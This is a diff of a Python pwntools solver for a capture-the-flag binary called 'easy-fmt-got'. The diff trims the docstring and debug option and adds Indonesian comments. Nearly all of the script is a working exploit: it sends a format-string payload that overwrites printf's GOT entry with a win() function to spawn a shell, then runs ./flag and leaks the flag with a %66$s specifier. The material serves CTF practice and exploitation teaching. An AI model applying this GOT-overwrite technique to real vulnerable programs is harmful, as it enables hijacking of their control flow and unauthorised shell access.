@@ -1,88 +1,53 @@
 #!/usr/bin/env python3
-"""
-easy-fmt-got — solver
-================
-
-Exploitation chain
-------------------
-1. Compute printf@GOT and win() address from the no-PIE binary.
-2. Craft format-string payload to overwrite printf@GOT -> win.
-3. Send payload, then send a trigger line so program calls win().
-4. In spawned shell, run ./flag and send %1$s to leak the embedded flag.
-
-Usage
------
-# against the remote server
-python3 solve.py
-
-# local binary (run the Docker container first, or just the compiled chall)
-python3 solve.py LOCAL
-
-# local binary with GDB attached
-python3 solve.py LOCAL DEBUG
-"""
-
 from pwn import *
 
-# ── load the binary so pwntools can resolve symbols/GOT addresses ────────────
 exe = ELF("./chall", checksec=False)
 context.binary = exe
 context.log_level = "info"
 
-
-# ── connection helper ─────────────────────────────────────────────────────────
-def conn() -> tube:
+def conn():
     if args.LOCAL:
         r = process([exe.path])
-        if args.DEBUG:
-            gdb.attach(r, gdbscript="""
-                b printf
-                continue
-            """)
         return r
-    return remote("localhost", 3012)   # ← change host/port for the real event
+    return remote("localhost", 3012)
 
-
-# ── main exploit ──────────────────────────────────────────────────────────────
-def main() -> None:
+def main():
     r = conn()
 
-    # banner/hint lines
-    r.recvline(timeout=1)
-    r.recvline(timeout=1)
-    r.recvline(timeout=1)
+    r.recvline(timeout=1)   # === easy-fmt-got ===
+    r.recvline(timeout=1)   # Can you get a shell?
+    r.recvline(timeout=1)   # Hint: ...
 
-    # ── step 1: resolve addresses from local ELF (no PIE) ─────────────────────
+    # Step 1: resolve addresses
     printf_got = exe.got["printf"]
-    win_addr = exe.symbols["win"]
-    log.info(f"printf GOT @ {hex(printf_got)}")
-    log.info(f"win()      @ {hex(win_addr)}")
+    win_addr   = exe.sym["win"]
+    log.info(f"printf@GOT = {hex(printf_got)}")
+    log.info(f"win()      = {hex(win_addr)}")
 
-    # ── step 2: craft format-string payload ───────────────────────────────────
-    # offset = 6: the buffer is the 6th argument seen by printf on x86-64
-    # write_size='short' uses %hn (2-byte) writes, keeping the payload shorter.
-    offset = 6
-    writes = {printf_got: win_addr}
-    payload = fmtstr_payload(offset, writes, write_size="short")
-    log.info(f"payload ({len(payload)} bytes): {payload[:32]}...")
-
-    # ── step 3: send payload and trigger hijacked printf call ─────────────────
+    # Step 2: overwrite printf@GOT -> win()
+    # offset = 6 (buf adalah argumen ke-6 di x86-64)
+    offset  = 6
+    payload = fmtstr_payload(offset, {printf_got: win_addr}, write_size="short")
+    log.info(f"payload ({len(payload)} bytes)")
     r.sendline(payload)
-    r.recvuntil(b"\n", timeout=3)
+    sleep(0.5)
+    r.recvline(timeout=1)
+
+    # Step 3: trigger win() → system("/bin/sh")
     r.sendline(b"trigger")
+    log.success("Shell spawned!")
+    sleep(0.5)
 
-    # ── step 4: use shell to leak flag from execute-only helper ───────────────
-    log.success("Shell should be up. Leaking flag via ./flag + %1$s")
+    # Step 4: jalankan ./flag lalu kirim %66$s
     r.sendline(b"./flag")
-    r.sendline(b"%1$s")
+    sleep(0.5)
+    r.recvuntil(b"Now where we?", timeout=2)
+    r.sendline(b"%66$s")
+    sleep(0.5)
+    output = r.recvline(timeout=2)
+    log.success(f"FLAG: {output.strip().decode(errors='replace')}")
 
-    leaked = r.recvline(timeout=2)
-    if leaked:
-        log.success(f"flag line: {leaked.strip().decode(errors='replace')}")
-
-    # keep shell for manual interaction
     r.interactive()
-
 
 if __name__ == "__main__":
     main()
